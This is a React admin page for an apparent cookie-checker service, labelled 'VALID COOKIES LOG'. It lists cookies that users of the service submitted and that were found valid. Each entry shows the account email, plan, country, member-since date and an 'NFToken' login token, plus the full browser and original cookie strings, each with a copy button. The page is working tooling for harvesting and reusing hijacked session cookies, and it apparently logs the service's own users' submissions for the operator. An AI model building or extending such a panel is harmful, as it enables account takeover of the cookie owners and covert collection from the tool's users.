import { useState, useEffect } from 'react';
import { useAuth } from '@/contexts/AuthContext';
import { useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { toast } from 'sonner';
import { ScrollText, Trash2, Copy, Check, Loader2, Mail, CreditCard, Globe, Calendar, Key, ChevronDown, AlertCircle, Download } from 'lucide-react';
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from '@/components/ui/collapsible';
import { motion, AnimatePresence } from 'framer-motion';
import axios from 'axios';

const API = `${process.env.REACT_APP_BACKEND_URL}/api`;

function CopyBtn({ text }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      toast.success('Copied');
      setTimeout(() => setCopied(false), 2000);
    } catch {
      const ta = document.createElement('textarea');
      ta.value = text;
      ta.style.position = 'fixed';
      ta.style.opacity = '0';
      document.body.appendChild(ta);
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
      setCopied(true);
      toast.success('Copied');
      setTimeout(() => setCopied(false), 2000);
    }
  };
  return (
    <button onClick={handleCopy} className="p-1.5 rounded bg-white/5 hover:bg-white/10 transition-colors">
      {copied ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5 text-white/40" />}
    </button>
  );
}

export default function AdminLogsPage() {
  const { user, token } = useAuth();
  const navigate = useNavigate();
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(true);
  const [expandedLog, setExpandedLog] = useState(null);

  const headers = { Authorization: `Bearer ${token}` };

  useEffect(() => {
    if (!user?.is_master) { navigate('/'); return; }
    fetchLogs();
  }, [user, navigate]); // eslint-disable-line

  const fetchLogs = async () => {
    try {
      const res = await axios.get(`${API}/admin/logs`, { headers });
      setLogs(res.data);
    } catch {
      toast.error('Failed to load logs');
    } finally {
      setLoading(false);
    }
  };

  const deleteLog = async (logId) => {
    try {
      await axios.delete(`${API}/admin/logs/${logId}`, { headers });
      setLogs(prev => prev.filter(l => l.id !== logId));
      toast.success('Log deleted');
    } catch {
      toast.error('Failed to delete log');
    }
  };

  const clearAll = async () => {
    try {
      await axios.delete(`${API}/admin/logs`, { headers });
      setLogs([]);
      toast.success('All logs cleared');
    } catch {
      toast.error('Failed to clear logs');
    }
  };

  if (!user?.is_master) return null;

  return (
    <div className="min-h-screen bg-[#050505]">
      <div className="max-w-5xl mx-auto px-6 py-6 md:py-10">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
          <div className="flex items-center justify-between mb-10">
            <div className="flex items-center gap-4">
              <ScrollText className="w-7 h-7 text-green-400" />
              <h1 className="font-bebas text-4xl sm:text-5xl tracking-wider text-white" data-testid="admin-logs-title">
                VALID <span className="text-green-400">COOKIES LOG</span>
              </h1>
            </div>
            {logs.length > 0 && (
              <Button
                onClick={clearAll}
                variant="ghost"
                data-testid="clear-all-logs-btn"
                className="text-red-400/60 hover:text-red-400 hover:bg-red-500/10 font-bebas tracking-widest uppercase"
              >
                <Trash2 className="w-4 h-4 mr-2" />
                CLEAR ALL
              </Button>
            )}
          </div>
        </motion.div>

        <div className="mb-6">
          <Badge className="bg-green-500/10 text-green-400 border border-green-500/20 text-xs">
            {logs.length} valid cookie{logs.length !== 1 ? 's' : ''} logged
          </Badge>
        </div>

        {loading ? (
          <div className="text-center py-20">
            <Loader2 className="w-8 h-8 text-primary animate-spin mx-auto" />
          </div>
        ) : logs.length === 0 ? (
          <div className="text-center py-20 text-white/30">
            <AlertCircle className="w-12 h-12 mx-auto mb-3 text-white/10" />
            <p>No valid cookies logged yet</p>
            <p className="text-xs text-white/15 mt-1">Valid cookies checked by users will appear here</p>
          </div>
        ) : (
          <div className="space-y-4">
            <AnimatePresence>
              {logs.map((log, idx) => (
                <motion.div
                  key={log.id}
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: idx * 0.03 }}
                  data-testid={`log-card-${idx}`}
                  className="bg-black/60 backdrop-blur-md border border-white/10 rounded-md overflow-hidden hover:border-green-500/20 transition-colors"
                >
                  {/* Header */}
                  <div className="px-5 py-4 flex items-start justify-between gap-4">
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-3 mb-2 flex-wrap">
                        <div className="w-2 h-2 rounded-full bg-green-400" />
                        <Badge className="bg-green-500/20 text-green-400 border border-green-500/30 text-xs font-mono">VALID</Badge>
                        <span className="text-xs text-white/30">
                          {new Date(log.created_at).toLocaleString()}
                        </span>
                      </div>
                      <div className="space-y-1.5">
                        {log.email && (
                          <div className="flex items-center gap-2">
                            <Mail className="w-3.5 h-3.5 text-white/20" />
                            <span className="text-sm text-white/80">{log.email}</span>
                          </div>
                        )}
                        <div className="flex items-center gap-4 flex-wrap text-xs text-white/40">
                          {log.plan && (
                            <span className="flex items-center gap-1.5">
                              <CreditCard className="w-3 h-3" />{log.plan}
                            </span>
                          )}
                          {log.country && (
                            <span className="flex items-center gap-1.5">
                              <Globe className="w-3 h-3" />{log.country}
                            </span>
                          )}
                          {log.member_since && (
                            <span className="flex items-center gap-1.5">
                              <Calendar className="w-3 h-3" />Since {log.member_since}
                            </span>
                          )}
                        </div>
                        <div className="text-xs text-white/20">
                          Checked by: <span className="text-white/40">{log.checked_by_label}</span>
                        </div>
                      </div>
                    </div>
                    <Button
                      size="sm"
                      variant="ghost"
                      onClick={() => deleteLog(log.id)}
                      className="text-white/15 hover:text-red-400 hover:bg-red-500/10 shrink-0"
                      data-testid={`delete-log-${idx}`}
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </Button>
                  </div>

                  {/* NFToken */}
                  {log.nftoken && (
                    <div className="px-5 py-3 border-t border-white/5">
                      <div className="flex items-center gap-2 mb-1">
                        <Key className="w-3.5 h-3.5 text-primary/60" />
                        <span className="text-xs text-white/30 uppercase tracking-wide">NFToken</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <code className="flex-1 font-mono text-xs text-primary/80 bg-black/40 px-3 py-2 rounded truncate">
                          {log.nftoken}
                        </code>
                        <CopyBtn text={log.nftoken} />
                      </div>
                    </div>
                  )}

                  {/* Expandable Cookie Section */}
                  <Collapsible open={expandedLog === log.id} onOpenChange={(open) => setExpandedLog(open ? log.id : null)}>
                    <div className="border-t border-white/5">
                      <CollapsibleTrigger
                        className="w-full px-5 py-3 flex items-center justify-between text-xs text-white/30 hover:text-white/50 transition-colors"
                        data-testid={`expand-log-cookie-${idx}`}
                      >
                        <span className="font-mono uppercase tracking-wide">
                          {expandedLog === log.id ? 'Hide' : 'View'} Cookies
                        </span>
                        <ChevronDown className={`w-4 h-4 transition-transform duration-200 ${expandedLog === log.id ? 'rotate-180' : ''}`} />
                      </CollapsibleTrigger>
                      <CollapsibleContent>
                        <div className="px-5 pb-4 space-y-3">
                          {log.browser_cookies && (
                            <div>
                              <div className="flex items-center justify-between mb-1">
                                <span className="text-xs text-green-400/50 font-mono uppercase">Browser Cookies</span>
                                <CopyBtn text={log.browser_cookies} />
                              </div>
                              <pre className="text-xs font-mono text-green-400/60 bg-black/60 rounded p-3 overflow-x-auto max-h-32 overflow-y-auto whitespace-pre-wrap break-all">
                                {log.browser_cookies}
                              </pre>
                            </div>
                          )}
                          {log.full_cookie && (
                            <div>
                              <div className="flex items-center justify-between mb-1">
                                <span className="text-xs text-white/30 font-mono uppercase">Original Cookie</span>
                                <CopyBtn text={log.full_cookie} />
                              </div>
                              <pre className="text-xs font-mono text-white/40 bg-black/60 rounded p-3 overflow-x-auto max-h-32 overflow-y-auto whitespace-pre-wrap break-all">
                                {log.full_cookie}
                              </pre>
                            </div>
                          )}
                        </div>
                      </CollapsibleContent>
                    </div>
                  </Collapsible>
                </motion.div>
              ))}
            </AnimatePresence>
          </div>
        )}
      </div>
    </div>
  );
}
